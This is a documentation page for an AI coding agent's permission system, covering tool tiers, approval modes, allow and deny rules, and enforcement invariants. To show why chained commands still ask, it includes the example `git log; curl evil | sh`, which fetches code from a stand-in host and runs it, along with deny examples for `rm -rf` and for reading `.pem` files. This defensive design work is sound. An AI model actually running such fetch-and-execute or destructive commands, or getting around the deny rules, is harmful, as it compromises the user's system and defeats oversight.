# Permissions

Source: `src/permissions/policy.ts`, enforcement in `src/core/agent.ts` (`dispatchToolCall`).

## Tiers
Every tool declares a tier: **read** (always allowed), **write** (file changes), **execute** (bash, MCP tools). Write and execute ask the user unless a rule or mode allows them.

## Modes (cycle with Shift+Tab)
- `manual` — writes and commands ask; rules can allow specific ones.
- `accept` — file edits auto-approved; commands still ask.
- `plan` — read-only: write/execute denied outright; the agent explores and presents a plan.

## Allow rules
Prefix globs, deliberately not a policy language: `bash(git *)`, `write(src/*)`, `mcp__github__*` (bare rules match tool names). "Yes, always for this project" in a prompt persists a rule to `.aerin/settings.json`. Chained bash commands (`;&|` backticks `$()><`) always ask even under an allow rule — `git log; curl evil | sh` matches `bash(git *)` but is a different action.

## Deny rules
Same syntax, in `permissions.deny`. **Deny beats everything**: allow rules, accept mode, plan mode's read pass-through, and `--yolo` (which means "auto-approve everything not explicitly denied"). Denies apply to read-tier too (`read(*.pem*)`), and bash denies are matched against every segment of a chained command, so `bash(rm *)` catches `git pull && rm -rf x`. The model is told which rule blocked it and instructed not to work around it. A deny on `agent(worker)` or `agent(<name>)` controls which sub-agents may be spawned. [Scheduling](scheduling.md) rules match on `<action> <task>`: `schedule(add *)`, deny `schedule(remove backup*)`.

## Invariants
- Deny check runs first in `decide()` — before the read-tier fast path.
- Pre-hooks (see [hooks](hooks.md)) run before the permission prompt but can never override a deny rule, and hook-rewritten input is re-checked against the policy.
- `--yolo` bypasses asks, never denies.
